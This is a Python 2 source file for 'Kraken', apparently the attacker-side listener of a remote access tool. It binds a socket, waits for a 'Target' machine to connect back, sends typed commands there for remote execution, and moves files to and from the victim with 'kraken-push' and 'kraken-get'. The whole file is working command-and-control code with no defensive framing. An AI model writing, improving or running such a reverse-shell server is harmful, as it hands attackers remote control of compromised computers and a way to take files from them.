import sys, os
import colorama
from colorama import Fore

if sys.version_info.major == 3:
    print('[-]Sorry you have to use Python2.')
    exit()

os.system("clear")

try:
    import json
    import socket 
    import termcolor
    from banner import banner
    from termcolor import cprint, colored
    import os 
    import base64
except ImportError:
    print("[-]Can not import Sockets!")

class Kraken:
    def __init__(self, ip, port):
        print(Fore.RED + banner)
        print(Fore.YELLOW + "[~]Binding Server on %s:%s" % (ip, str(port)))
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((ip, port))
        server.listen(0)
        print(Fore.YELLOW + "[~]Waiting Connection...")
        self.conn, addr = server.accept()
        cprint(Fore.CYAN + "\n[+]Server Got a Connection!\n", attrs=['blink'])
        print(Fore.GREEN + "[%s][%s]" % (addr[0], addr[1]))


    def sterelize_send(self, data):
        json_data = json.dumps(data)
        self.conn.send(json_data)

    def sterelize_recv(self):
        json_data = str()
        while True:
            try:
                json_data = json_data + self.conn.recv(1024)
                return json.loads(json_data)
            
            except ValueError:
                continue

    def exec_command(self, cmnd):
        self.sterelize_send(cmnd)

        if cmnd[0] == "clear":
            os.system("clear")
        
        elif cmnd[0] == "exit":
            self.conn.close()
            print("\n[+]Connection with Target Killed!")
            print("\nBye!")
            exit()

        return self.sterelize_recv()      

    def write_file(self, to, data):
        with open(to, "wb") as f:
            f.write(base64.b64decode(data))
            return "[+]Transfer between Target and Kraken done!"

    def read_file(self, to):
        with open(to, "rb") as f:
            return base64.b64encode(f.read())

    def run(self):
        run = True
        while(run):
            inpt = raw_input(Fore.YELLOW + "Kr4k3n> " + Fore.WHITE) 
            inpt = inpt.split()
            try:
                if inpt[0] == "kraken-push":
                    content = self.read_file(inpt[1])
                    inpt.append(content)

                result = self.exec_command(inpt)
                
                if inpt[0] == "kraken-get" and "[-]Error " not in result:
                    result = self.write_file(inpt[1],result)

                if inpt[0] == "kraken-help":
                    print("""
%sMade by: %s@k4sh1r1ntu0 (Instagram)
%sGithub : %shttps://github.com/YanOScompany 

[COMMANDS]
%skraken-help: %sCommands list
%skraken-push : %sUpload File
%skraken-get  : %sDownload file

                    """ % (Fore.RED, Fore.YELLOW, Fore.RED, Fore.YELLOW, Fore.RED, Fore.YELLOW, Fore.RED, Fore.YELLOW,Fore.RED, Fore.YELLOW))
            except Exception:
                result = "[-]Error during command execution."

            print(Fore.WHITE + result)

Kraken = Kraken(str(sys.argv[1]), int(sys.argv[2]))
Kraken.run()
